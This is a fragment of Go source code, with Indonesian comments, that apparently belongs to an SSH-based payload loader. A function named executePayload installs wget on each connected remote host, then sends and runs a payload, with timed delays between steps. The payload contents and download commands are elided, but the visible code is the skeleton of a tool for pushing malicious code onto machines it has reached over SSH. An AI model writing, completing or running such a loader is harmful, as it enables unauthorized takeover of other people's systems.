...
// ==================== PAYLOAD CONSTANTS ====================
const (
	INSTALL_WGET_DELAY = 8 * time.Second  // Tunggu 8-10 detik setelah install wget
	PAYLOAD_DELAY      = 12 * time.Second // Tunggu 10-15 detik setelah kirim payload
)
...
func executePayload(client *ssh.Client) {
	...
	// Step 1: Install wget
	log.Printf("📦 Installing wget on %s...", client.RemoteAddr())
	if err := session.Run(installWget); err != nil {
		log.Printf("Failed to install wget on %s: %v", client.RemoteAddr(), err)
	} else {
		log.Printf("✅ wget installed on %s", client.RemoteAddr())
	}
	
	// Step 2: Wait 8-10 detik setelah install wget (biar proses selesai)
	log.Printf("⏳ Waiting %v for wget installation to complete...", INSTALL_WGET_DELAY)
	...
	// Step 4: Wait 10-15 detik setelah payload (biar payload jalan)
